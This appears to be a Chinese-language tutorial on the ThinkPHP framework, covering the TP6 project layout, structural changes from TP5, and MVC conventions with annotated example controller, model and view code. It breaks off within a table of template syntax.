<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">tp6-test/                 ← ★ 整个项目根目录</span><br><span class="line">├── app/                  ← ★ 应用代码目录（你写的业务逻辑）</span><br><span class="line">│   ├── controller/           ←   控制器目录 (C)，URL 路由默认指向这里</span><br><span class="line">│   │   └── Index.php         ←     示例控制器，默认访问 `/` 会走这里</span><br><span class="line">│   ├── AppService.php        ←   应用服务类，可注册服务绑定</span><br><span class="line">│   ├── BaseController.php    ←   控制器基类（定义通用逻辑）</span><br><span class="line">│   ├── ExceptionHandle.php   ←   全局异常处理类</span><br><span class="line">│   ├── Request.php           ←   自定义请求类（可扩展）</span><br><span class="line">│   ├── common.php            ←   应用公共函数，系统会自动加载</span><br><span class="line">│   ├── event.php             ←   应用事件定义（事件/监听器绑定）</span><br><span class="line">│   ├── middleware.php        ←   中间件注册表</span><br><span class="line">│   ├── provider.php          ←   服务提供者注册</span><br><span class="line">│   └── service.php           ←   容器服务绑定</span><br><span class="line">│</span><br><span class="line">├── public/               ← ★ Web 服务器根目录（部署时只暴露这一层）</span><br><span class="line">│   ├── index.php             ←   应用入口文件，所有 HTTP 请求从这里进来</span><br><span class="line">│   ├── favicon.ico           ←   网页小图标</span><br><span class="line">│   ├── robots.txt            ←   搜索引擎爬虫控制文件</span><br><span class="line">│   ├── router.php            ←   内置服务器时用于模拟路由（开发用）</span><br><span class="line">│   └── static/               ←   静态资源目录（JS/CSS/图片等）</span><br><span class="line">│</span><br><span class="line">├── config/               ← ★ 应用配置目录（集中管理）</span><br><span class="line">│   ├── app.php               ←   应用基本设置</span><br><span class="line">│   ├── cache.php             ←   缓存设置</span><br><span class="line">│   ├── console.php           ←   CLI 命令设置</span><br><span class="line">│   ├── cookie.php            ←   Cookie 配置</span><br><span class="line">│   ├── database.php          ←   数据库连接设置</span><br><span class="line">│   ├── filesystem.php        ←   本地/云存储设置</span><br><span class="line">│   ├── lang.php              ←   多语言配置</span><br><span class="line">│   ├── log.php               ←   日志通道设置</span><br><span class="line">│   ├── middleware.php        ←   全局中间件配置</span><br><span class="line">│   ├── route.php             ←   路由配置</span><br><span class="line">│   ├── session.php           ←   会话 Session 设置</span><br><span class="line">│   ├── trace.php             ←   Trace 调试配置</span><br><span class="line">│   └── view.php              ←   模板渲染设置</span><br><span class="line">│</span><br><span class="line">├── route/                ← 路由定义（推荐写在这里而非代码里）</span><br><span class="line">│   └── app.php               ←   默认路由定义文件（支持闭包/控制器映射等）</span><br><span class="line">│</span><br><span class="line">├── runtime/              ← 运行期文件（缓存、日志、编译模板等自动生成）</span><br><span class="line">│</span><br><span class="line">├── extend/               ← 自定义扩展类目录（可类比 “lib/”）</span><br><span class="line">│</span><br><span class="line">├── vendor/               ← ★ Composer 安装的依赖目录（含 thinkphp 框架本体）</span><br><span class="line">│   ├── topthink/             ←   ThinkPHP 框架核心源码（think-orm、framework 等）</span><br><span class="line">│   ├── symfony/              ←   Symfony 的组件（如 var-dumper）</span><br><span class="line">│   ├── psr/                  ←   PSR 规范接口（Logger, Container 等）</span><br><span class="line">│   ├── autoload.php          ←   自动加载入口</span><br><span class="line">│   └── ...                   ←   其他库（由 composer 安装生成）</span><br><span class="line">│</span><br><span class="line">├── think                 ← ThinkPHP 命令行工具（用于 `php think`）</span><br><span class="line">│</span><br><span class="line">├── composer.json         ← ★ 项目依赖声明文件，执行 `composer install` 使用</span><br><span class="line">├── composer.lock         ←   锁定依赖的具体版本（保证环境一致）</span><br><span class="line">├── LICENSE.txt           ← 项目开源许可证</span><br><span class="line">└── README.md             ← 项目说明文档</span><br></pre></td></tr></table></figure></div>

<p>主要的变化有：</p>
<ul>
<li><strong>应用结构变化：</strong><ul>
<li><strong>TP5 默认启用多模块（模块 &#x3D; 子应用）</strong>，每个模块是一个 MVC 单元，位于 <code>application/模块名/</code> 下（如 <code>index/</code>、<code>admin/</code>）。</li>
<li><strong>TP6&#x2F;TP8 默认是单一应用结构</strong>，所有控制器、模型等放在 <code>app/</code> 目录下。如果需要多模块（多应用模式），<strong>需要手动在配置中启用</strong>（<code>app.multi_app = true</code>），并手动创建子目录如 <code>app/index/</code>、<code>app/admin/</code>。</li>
</ul>
</li>
<li><strong>框架源码位置变化：</strong><ul>
<li><strong>TP5 的框架源码在 <code>thinkphp/</code> 目录</strong>，是项目结构的一部分。</li>
<li><strong>TP6&#x2F;TP8 的框架核心被完全 Composer 化</strong>，源码位于 <code>vendor/topthink/framework/src/think/</code> 中。<br>这符合现代 Composer 包管理规范，**<code>thinkphp/</code> 目录不再存在**。</li>
</ul>
</li>
<li><strong>配置文件组织变化：</strong><ul>
<li><strong>TP5 的配置分布在 <code>application/</code> 根下多个文件中</strong>（如 <code>config.php</code>、<code>database.php</code>）。</li>
<li><strong>TP6&#x2F;TP8 把所有配置统一集中到 <code>config/</code> 目录中</strong>，按功能拆分多个文件（如 <code>config/app.php</code>、<code>config/database.php</code>、<code>config/session.php</code>）。配置加载方式也更加标准化和可扩展。</li>
</ul>
</li>
</ul>
<h2 id="框架使用"><a href="#框架使用" class="headerlink" title="框架使用"></a>框架使用</h2><p>ThinkPHP 是一个基于<strong>多模块 + MVC 架构</strong>模式的 PHP 框架，强调结构分离、路由映射和快速开发。</p>
<p>官方文档：</p>
<ul>
<li><p><strong>ThinkPHP 5.0 文档</strong><br>👉 <a class="link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/118003" >https://www.kancloud.cn/manual/thinkphp5/118003<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><strong>ThinkPHP 5.1 文档</strong><br>👉 <a class="link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5_1/353946" >https://www.kancloud.cn/manual/thinkphp5_1/353946<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><strong>ThinkPHP 6.0 文档</strong><br>👉 <a class="link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037479" >https://www.kancloud.cn/manual/thinkphp6_0/1037479<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
<h3 id="MVC-架构"><a href="#MVC-架构" class="headerlink" title="MVC 架构"></a>MVC 架构</h3><p><strong>MVC 架构</strong>是 ThinkPHP 的基础架构设计，强调<strong>职责分离、解耦合、协同开发</strong>。具体体现在 <code>application</code> 目录下。通常，<code>application</code> 目录下的同一个模块会分为 <code>model</code>、<code>view</code>、<code>controller</code> 三个目录，分别对应 MVC 架构的三个组成部分。在这一架构中，控制器不仅仅是“中介者”，它还负责接收用户请求、验证数据、调度业务逻辑、决定展示视图。</p>
<table>
<thead>
<tr>
<th>组成</th>
<th>位置（默认）</th>
<th>作用说明</th>
</tr>
</thead>
<tbody><tr>
<td>Model</td>
<td><code>application/[模块]/model/</code></td>
<td>数据操作层（数据库 CURD、逻辑封装）</td>
</tr>
<tr>
<td>View</td>
<td><code>application/[模块]/view/</code></td>
<td>页面展示层（HTML模板、标签）</td>
</tr>
<tr>
<td>Controller</td>
<td><code>application/[模块]/controller/</code></td>
<td>业务控制层（请求处理、业务调度）</td>
</tr>
</tbody></table>
<p>例如对于 <code>index</code> 模块，目录结构如下。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">application/</span><br><span class="line">├── index/           ← 默认模块</span><br><span class="line">│   ├── controller/  ← 控制器</span><br><span class="line">│   ├── model/       ← 模型（可选）</span><br><span class="line">│   ├── view/        ← 视图</span><br><span class="line">├── common.php       ← 公共函数文件</span><br><span class="line">├── route.php        ← 路由定义（可选）</span><br></pre></td></tr></table></figure></div>

<h4 id="Controller：控制器层（业务流程控制）"><a href="#Controller：控制器层（业务流程控制）" class="headerlink" title="Controller：控制器层（业务流程控制）"></a>Controller：控制器层（业务流程控制）</h4><p><strong>控制器层</strong>负责接收请求（参数），验证参数，调用业务逻辑（模型）并最终决定渲染哪一个视图，或返回 JSON 响应。</p>
<p>例如 <code>application/index/controller/User.php</code>：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置当前类的命名空间，对应目录结构：application/index/controller/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">application</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入 ThinkPHP 的控制器基类，提供模板渲染、跳转提示等功能</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入模型类 User，位于 application/index/model/User.php</span></span><br><span class="line"><span class="comment">// 注意此处的 User 是模型类，不是当前控制器本身</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">application</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ===================== 用户列表 =====================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// User::all() 是模型 User 继承自 think\Model 的静态方法</span></span><br><span class="line">        <span class="comment">// 用于查询 user 表的所有数据，返回一个模型集合（Collection）</span></span><br><span class="line">        <span class="comment">// 注意：这里的 User 是模型类，而不是当前控制器类，因为上面 use 语句导入了模型</span></span><br><span class="line">        <span class="variable">$users</span> = <span class="title class_">User</span>::<span class="title function_ invoke__">all</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 渲染模板：application/index/view/user/index.html</span></span><br><span class="line">        <span class="comment">// 并传入变量 $users 到模板中（可用 &#123;$users&#125; 访问）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;index&#x27;</span>, [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="variable">$users</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===================== 添加用户表单页面 =====================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 渲染模板 create.html（路径同上）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;create&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===================== 提交表单并保存用户 =====================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取所有 POST 提交的字段（默认返回数组）</span></span><br><span class="line">        <span class="comment">// input(&#x27;post.&#x27;) 是 TP5 的全局助手函数，获取 POST 参数</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用自动验证（ThinkPHP5 推荐方式）</span></span><br><span class="line">        <span class="comment">// validate(&#x27;index/User&#x27;) 会自动加载 application/index/validate/User.php</span></span><br><span class="line">        <span class="variable">$validate</span> = <span class="title function_ invoke__">validate</span>(<span class="string">&#x27;index/User&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$validate</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="comment">// 如果验证失败，返回错误提示并跳转回前页</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="variable">$validate</span>-&gt;<span class="title function_ invoke__">getError</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化模型并写入数据库（等价于 INSERT）</span></span><br><span class="line">        <span class="comment">// 注意：可以用 User::create($data)，这里只是写法不同，含义一致</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入成功后跳转到用户列表页，并显示成功提示</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;添加成功&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;user/index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===================== 删除用户 =====================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 先判断 id 合法性（防止非法注入）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;参数非法&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User::destroy($id) 是框架提供的快捷删除方法，主键删除</span></span><br><span class="line">        <span class="title class_">User</span>::<span class="title function_ invoke__">destroy</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除后跳转回用户列表</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;删除成功&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;user/index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="Model：模型层（数据访问与封装）"><a href="#Model：模型层（数据访问与封装）" class="headerlink" title="Model：模型层（数据访问与封装）"></a>Model：模型层（数据访问与封装）</h4><p>在 ThinkPHP 中，<strong>模型（Model）是数据库的面向对象封装</strong>，每一个模型类通常对应一张数据库表，它提供了数据表结构的映射，字段的类型转换，数据验证、访问、修改等。模型层本质上是对增删改查等操作的封装，因此你可以像操作对象一样去操作数据库。</p>
<p>在 ThinkPHP 中，模型层的对象需要继承于 <code>think\Model</code>。<code>think\Model</code> 是 ThinkPHP 的核心模型基类，内置了很多模型层常用的功能，如：</p>
<ul>
<li>数据库 CURD 方法（<code>get</code>、<code>all</code>、<code>save</code>、<code>destroy</code> 等）</li>
<li>类型转换（<code>$type</code> 属性）</li>
<li>自动时间戳写入（<code>$autoWriteTimestamp</code>）</li>
<li>访问器与修改器（<code>getXxxAttr()</code> &#x2F; <code>setXxxAttr()</code>）</li>
<li>事件（beforeInsert、afterDelete 等）</li>
</ul>
<p>而我们在编写模型层代码的时候实际上就是根据业务需求继承填 <code>think\Model</code> 类并充的字段以及重写方法。</p>
<p>例如下面的 <code>application/index/model/User.php</code> 针对的是数据库中的 user 表。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置该类的命名空间，必须与目录结构对应：application/index/model</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">application</span>\<span class="title class_">index</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入 ThinkPHP 框架的模型基类（ORM 操作的核心）</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 User 模型类，用于操作数据库中的 user 表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动写入时间戳字段</span></span><br><span class="line"><span class="comment">     * - 设置为 &#x27;datetime&#x27;，表示写入为 Y-m-d H:i:s 格式</span></span><br><span class="line"><span class="comment">     * - 该功能会自动维护 create_time 和 update_time 两个字段（如果你表中有）</span></span><br><span class="line"><span class="comment">     * - 实际插入数据时不需要你手动设置这两个字段</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$autoWriteTimestamp</span> = <span class="string">&#x27;datetime&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类型转换设置</span></span><br><span class="line"><span class="comment">     * - 当从数据库中查询数据后，框架会自动将这些字段转换为指定的类型</span></span><br><span class="line"><span class="comment">     * - 避免类型错误，例如数据库返回字符串而你期望使用整数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$type</span> = [</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>   =&gt; <span class="string">&#x27;integer&#x27;</span>, <span class="comment">// 自动转换 id 字段为整数</span></span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;string&#x27;</span>,  <span class="comment">// 明确 name 字段为字符串</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 字段访问器（getNameAttr）</span></span><br><span class="line"><span class="comment">     * - 每次通过 $user-&gt;name 获取 name 字段时，都会自动调用这个方法</span></span><br><span class="line"><span class="comment">     * - 用于“格式化显示”的场景，比如这里将用户名统一变成大写</span></span><br><span class="line"><span class="comment">     * - 注意命名规则：get + 字段名首字母大写 + Attr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNameAttr</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 字段修改器（setNameAttr）</span></span><br><span class="line"><span class="comment">     * - 每次给 $user-&gt;name 赋值或通过 create/save 写入数据时，都会调用这个方法</span></span><br><span class="line"><span class="comment">     * - 用于“格式化存储”的场景，比如这里自动去除前后空格</span></span><br><span class="line"><span class="comment">     * - 命名规则：set + 字段名首字母大写 + Attr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setNameAttr</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 ThinkPHP 5 中，<strong>模型类默认会自动映射到数据库中的某张表</strong>，这个映射是<strong>基于约定</strong>进行的。默认映射规则如为：</p>
<ul>
<li><strong>类名去掉命名空间部分</strong></li>
<li><strong>将驼峰命名转换为下划线风格</strong></li>
<li><strong>转为小写</strong></li>
<li><strong>添加数据库配置中的前缀（如 tp_）</strong></li>
</ul>
<p>例如：</p>
<table>
<thead>
<tr>
<th>模型类名</th>
<th>默认对应表名</th>
</tr>
</thead>
<tbody><tr>
<td><code>User</code></td>
<td><code>tp_user</code></td>
</tr>
<tr>
<td><code>UserInfo</code></td>
<td><code>tp_user_info</code></td>
</tr>
<tr>
<td><code>OrderDetailItem</code></td>
<td><code>tp_order_detail_item</code></td>
</tr>
</tbody></table>
<p>其中假设你的数据库配置中定义了前缀 <code>tp_</code>：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config/database.php</span></span><br><span class="line"><span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;tp_&#x27;</span>,</span><br></pre></td></tr></table></figure></div>

<p>当然如果你想<strong>手动指定模型对应的表名</strong>，可以用以下方式：</p>
<ul>
<li><p>使用 <code>$name</code> 属性（逻辑表名，依然会加前缀）</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&#x27;member&#x27;</span>; <span class="comment">// 最终映射到 tp_member 表（受 prefix 影响）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>使用 <code>$table</code> 属性（绝对表名，不加前缀）</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;custom_user_table&#x27;</span>; <span class="comment">// 直接使用完整表名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="View：视图层（页面展示）"><a href="#View：视图层（页面展示）" class="headerlink" title="View：视图层（页面展示）"></a>View：视图层（页面展示）</h4><p>在 ThinkPHP 中，视图层负责将数据以 HTML 形式展现给用户。当你在控制器中调用：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(); <span class="comment">// 或者 $this-&gt;fetch(&#x27;index&#x27;)</span></span><br></pre></td></tr></table></figure></div>

<p>框架会根据以下<strong>默认约定路径规则</strong>去查找视图文件：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">application/</span><br><span class="line">└── [模块名]/</span><br><span class="line">    └── view/</span><br><span class="line">        └── [控制器名（小写）]/</span><br><span class="line">            └── [操作方法名].html</span><br></pre></td></tr></table></figure></div>

<p>例如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">application/</span><br><span class="line">└── index/</span><br><span class="line">    └── view/</span><br><span class="line">        └── user/</span><br><span class="line">            ├── index.html    ← 对应 User 控制器的 index() 方法</span><br><span class="line">            ├── create.html   ← 对应 User 控制器的 create() 方法</span><br></pre></td></tr></table></figure></div>

<p>框架根据控制器名 + 方法名来自动匹配视图文件。</p>
<ul>
<li><code>User::index()</code> → 渲染 <code>view/user/index.html</code></li>
<li><code>User::create()</code> → 渲染 <code>view/user/create.html</code></li>
</ul>
<p>ThinkPHP 使用的是 <strong>ThinkTemplate 模板引擎</strong>，支持变量输出、条件语句、循环语句、URL 生成等，语法清晰易读，适合快速开发。</p>
<p>视图渲染由控制器完成，使用 <code>$this-&gt;fetch()</code> 方法：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;index&#x27;</span>, [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="variable">$users</span>]);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>第一个参数是模板文件名（省略 <code>.html</code>）</li>
<li>第二个参数是传递给模板的变量数组</li>
</ul>
<p>你可以在模板中使用 <code>&#123;$users&#125;</code> 来访问传入的数据。常见语法有：</p>
<table>
<thead>
<tr>
<th>功能</th>
<th>语法示例</th>
</tr>
</thead>
<tbody><tr>
<td>变量输出</td>
<td><code>&#123;$user.name&#125;</code></td>
</tr>
<tr>
<td>条件判断</td>
<td><code>&#123;if $user.name == &#39;admin&#39;&#125;...&#123;/if&#125;</code></td>
</tr>
<tr>
<td>循环输出</td>
<td><code>&#123;volist name=&quot;users&quot; id=&quot;user&quot;&#125;...&#123;/volist&#125;</code></td>
</tr>
<tr>
<td>URL 生成</td>
<td><code>&#123;:url(&#39;user/delete&#39;, [&#39;id&#39; =&gt; $user.id])&#125;</code></td>
</tr>
<tr>
<td>模板继承</td>
<td><code>&#123;extend name=&quot;layout&quot;&#125;</code></td>
</tr>
